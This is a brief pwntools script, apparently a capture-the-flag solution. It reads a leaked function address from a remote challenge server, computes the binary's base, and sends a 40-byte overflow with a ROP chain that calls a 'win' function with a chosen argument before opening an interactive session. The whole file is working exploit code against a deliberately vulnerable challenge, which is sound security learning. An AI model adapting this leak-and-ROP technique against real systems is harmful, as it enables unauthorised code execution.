from pwn import p64, remote, process, log

#p = process("./pwnme")
#gdb.attach(p)

p = remote("0.cloud.chals.io", 22287)

leak = p.recvline().decode().strip()
leak = leak[leak.index("0x"):]
log.info(f"win {leak=}")

offset = b"A"*40
arg = 0xdeadbeef

win_offset = 0x122e #find with objdump
base = int(leak,16)-win_offset
pop_rdi_ret = base + 0x1323 #find these with ROPgadget
ret = base + 0x101a

log.info(f"{hex(pop_rdi_ret)=}")
log.info(f"{hex(ret)=}")

payload = [
    offset,
    p64(pop_rdi_ret),
    p64(arg),
    p64(ret),
    p64(int(leak,16))
]

payload = b''.join(payload)

p.sendline(payload)

p.interactive()